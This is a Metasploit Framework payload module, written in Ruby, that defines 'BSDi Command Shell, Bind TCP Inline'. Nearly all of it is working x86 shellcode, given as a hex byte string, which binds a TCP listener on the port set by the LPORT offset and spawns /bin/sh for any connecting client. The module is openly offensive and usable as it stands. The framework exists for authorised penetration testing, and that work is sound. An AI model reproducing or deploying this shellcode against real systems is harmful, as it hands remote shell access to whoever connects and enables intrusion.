##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/handler/bind_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'BSDi Command Shell, Bind TCP Inline',
      'Description'   => 'Listen for a connection and spawn a command shell',
      'Author'        => [ 'skape', 'optyx' ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'bsdi',
      'Arch'          => ARCH_X86,
      'Handler'       => Msf::Handler::BindTcp,
      'Session'       => Msf::Sessions::CommandShell,
      'Payload'       =>
        {
          'Offsets' =>
            {
              'LPORT'    => [ 0x1f, 'n' ],
            },
          'Payload' =>
            "\x89\xe5\x68\x00\x07\x00\xc3\xb8\x9a\x00\x00\x00\x99\x50\x89\xe6" +
            "\x31\xc0\x50\x40\x50\x40\x50\xb0\x61\xff\xd6\x52\x68\x10\x02\xbf" +
            "\xbf\x89\xe3\x6a\x10\x53\x50\x6a\x68\x58\xff\xd6\xb0\x6a\xff\xd6" +
            "\x59\x52\x52\x51\xb0\x1e\xff\xd6\x97\x6a\x02\x59\x6a\x5a\x58\x51" +
            "\x57\xff\xd6\x49\x79\xf6\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69" +
            "\x6e\x89\xe3\x50\x54\x53\xb0\x3b\xff\xd6"
        }
      ))
  end

end
